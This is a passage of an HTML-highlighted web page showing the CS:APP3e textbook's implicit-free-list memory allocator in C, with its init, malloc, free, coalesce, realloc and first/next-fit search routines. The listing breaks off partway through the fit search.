class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Simple, 32-bit and 64-bit clean allocator based on implicit free</span></span><br><span class="line"><span class="comment"> * lists, first-fit placement, and boundary tag coalescing, as described</span></span><br><span class="line"><span class="comment"> * in the CS:APP3e text. Blocks must be aligned to doubleword (8 byte)</span></span><br><span class="line"><span class="comment"> * boundaries. Minimum block size is 16 bytes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mm.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"memlib.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If NEXT_FIT defined use next fit search, else use first-fit search</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_FITx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin mallocmacros */</span></span><br><span class="line"><span class="comment">/* Basic constants and macros */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE       4       <span class="comment">/* Word and header/footer size (bytes) */</span> <span class="comment">//line:vm:mm:beginconst</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE       8       <span class="comment">/* Double word size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE  (1&lt;&lt;12)  <span class="comment">/* Extend heap by this amount (bytes) */</span>  <span class="comment">//line:vm:mm:endconst</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc)  ((size) | (alloc)) <span class="comment">//line:vm:mm:pack</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)       (*(unsigned int *)(p))            <span class="comment">//line:vm:mm:get</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val)  (*(unsigned int *)(p) = (val))    <span class="comment">//line:vm:mm:put</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)                   <span class="comment">//line:vm:mm:getsize</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)                    <span class="comment">//line:vm:mm:getalloc</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp)       ((char *)(bp) - WSIZE)                      <span class="comment">//line:vm:mm:hdrp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp)       ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) <span class="comment">//line:vm:mm:ftrp</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous blocks */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp)  ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE))) <span class="comment">//line:vm:mm:nextblkp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp)  ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE))) <span class="comment">//line:vm:mm:prevblkp</span></span></span><br><span class="line"><span class="comment">/* $end mallocmacros */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *heap_listp = <span class="number">0</span>;  <span class="comment">/* Pointer to first block */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NEXT_FIT</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *rover;           <span class="comment">/* Next fit rover */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes for internal helper routines */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> asize)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printblock</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkheap</span><span class="params">(<span class="keyword">int</span> verbose)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkblock</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_init - Initialize the memory manager</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mminit */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Create the initial empty heap */</span></span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span>*WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span>) <span class="comment">//line:vm:mm:begininit</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);                          <span class="comment">/* Alignment padding */</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">1</span>*WSIZE), PACK(DSIZE, <span class="number">1</span>)); <span class="comment">/* Prologue header */</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">2</span>*WSIZE), PACK(DSIZE, <span class="number">1</span>)); <span class="comment">/* Prologue footer */</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">3</span>*WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));     <span class="comment">/* Epilogue header */</span></span><br><span class="line">    heap_listp += (<span class="number">2</span>*WSIZE);                     <span class="comment">//line:vm:mm:endinit</span></span><br><span class="line">    <span class="comment">/* $end mminit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NEXT_FIT</span></span><br><span class="line">    rover = heap_listp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* $begin mminit */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Extend the empty heap with a free block of CHUNKSIZE bytes */</span></span><br><span class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mminit */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block with at least size bytes of payload</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmmalloc */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">/* Adjusted block size */</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize; <span class="comment">/* Amount to extend heap if no fit */</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* $end mmmalloc */</span></span><br><span class="line">    <span class="keyword">if</span> (heap_listp == <span class="number">0</span>)&#123;</span><br><span class="line">        mm_init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $begin mmmalloc */</span></span><br><span class="line">    <span class="comment">/* Ignore spurious requests */</span></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Adjust block size to include overhead and alignment reqs. */</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE)                                          <span class="comment">//line:vm:mm:sizeadjust1</span></span><br><span class="line">        asize = <span class="number">2</span>*DSIZE;                                        <span class="comment">//line:vm:mm:sizeadjust2</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        asize = DSIZE * ((size + (DSIZE) + (DSIZE<span class="number">-1</span>)) / DSIZE); <span class="comment">//line:vm:mm:sizeadjust3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search the free list for a fit */</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;  <span class="comment">//line:vm:mm:findfitcall</span></span><br><span class="line">        place(bp, asize);                  <span class="comment">//line:vm:mm:findfitplace</span></span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* No fit found. Get more memory and place the block */</span></span><br><span class="line">    extendsize = MAX(asize,CHUNKSIZE);                 <span class="comment">//line:vm:mm:growheap1</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize/WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;                                  <span class="comment">//line:vm:mm:growheap2</span></span><br><span class="line">    place(bp, asize);                                 <span class="comment">//line:vm:mm:growheap3</span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmmalloc */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Free a block</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmfree */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* $end mmfree */</span></span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* $begin mmfree */</span></span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="comment">/* $end mmfree */</span></span><br><span class="line">    <span class="keyword">if</span> (heap_listp == <span class="number">0</span>)&#123;</span><br><span class="line">        mm_init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $begin mmfree */</span></span><br><span class="line"></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(bp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* $end mmfree */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * coalesce - Boundary tag coalescing. Return ptr to coalesced block</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmfree */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;            <span class="comment">/* Case 1 */</span></span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;      <span class="comment">/* Case 2 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size,<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;      <span class="comment">/* Case 3 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;                                     <span class="comment">/* Case 4 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) +</span><br><span class="line">                GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $end mmfree */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NEXT_FIT</span></span><br><span class="line">    <span class="comment">/* Make sure the rover isn't pointing into the free block */</span></span><br><span class="line">    <span class="comment">/* that we just coalesced */</span></span><br><span class="line">    <span class="keyword">if</span> ((rover &gt; (<span class="keyword">char</span> *)bp) &amp;&amp; (rover &lt; NEXT_BLKP(bp)))</span><br><span class="line">        rover = bp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* $begin mmfree */</span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmfree */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Naive implementation of realloc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> oldsize;</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If size == 0 then this is just free, and we return NULL. */</span></span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) &#123;</span><br><span class="line">        mm_free(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If oldptr is NULL, then this is just malloc. */</span></span><br><span class="line">    <span class="keyword">if</span>(ptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If realloc() fails the original block is left untouched  */</span></span><br><span class="line">    <span class="keyword">if</span>(!newptr) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy the old data. */</span></span><br><span class="line">    oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">if</span>(size &lt; oldsize) oldsize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, ptr, oldsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free the old block. */</span></span><br><span class="line">    mm_free(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_checkheap - Check the heap for correctness</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_checkheap</span><span class="params">(<span class="keyword">int</span> verbose)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    checkheap(verbose);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The remaining routines are internal helper routines</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * extend_heap - Extend heap with free block and return its block pointer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmextendheap */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words+<span class="number">1</span>) * WSIZE : words * WSIZE; <span class="comment">//line:vm:mm:beginextend</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;                                        <span class="comment">//line:vm:mm:endextend</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize free block header/footer and the epilogue header */</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));         <span class="comment">/* Free block header */</span>   <span class="comment">//line:vm:mm:freeblockhdr</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));         <span class="comment">/* Free block footer */</span>   <span class="comment">//line:vm:mm:freeblockftr</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>)); <span class="comment">/* New epilogue header */</span> <span class="comment">//line:vm:mm:newepihdr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Coalesce if the previous block was free */</span></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);                                          <span class="comment">//line:vm:mm:returnblock</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmextendheap */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * place - Place block of asize bytes at start of free block bp</span></span><br><span class="line"><span class="comment"> *         and split if remainder would be at least minimum block size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmplace */</span></span><br><span class="line"><span class="comment">/* $begin mmplace-proto */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> asize)</span></span></span><br><span class="line"><span class="function"><span class="comment">/* $end mmplace-proto */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= (<span class="number">2</span>*DSIZE)) &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize-asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize-asize, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmplace */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * find_fit - Find a fit for a block with asize bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmfirstfit */</span></span><br><span class="line"><span class="comment">/* $begin mmfirstfit-proto */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span></span></span><br><span class="line"><span class="function"><span class="comment">/* $end mmfirstfit-proto */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* $end mmfirstfit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NEXT_FIT</span></span><br><span class="line">    <span class="comment">/* Next fit search */</span></span><br><span class="line">    <span class="keyword">char</span> *oldrover = rover;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search from the rover to the end of list */</span></span><br><span class="line">    <span class="keyword">for</span> ( ; GET_SIZE(HDRP(rover)) &gt; <span class="number">0</span>; rover = NEXT_BLKP(rover))</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(rover)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(rover))))</span><br><span class="line">            <span class="keyword">return</span> rover;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* search from start of list to old rover */</span></span><br><span class="line">    <span class="keyword">for</span> (rover = heap_listp; rover &lt; oldrover; rover = NEXT_BLKP(rover))</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(rover)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(rover))))</span><br><span class="line">            <span class="keyword">return</span> rover;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;  <span class="comment">/* no fit found */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* $begin mmfirstfit */</span></span><br><span class="line">    <span class="comment">/* First-fit search */</span></span><br><span class="line">    <span class="keyword">void</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123;</span><br><span 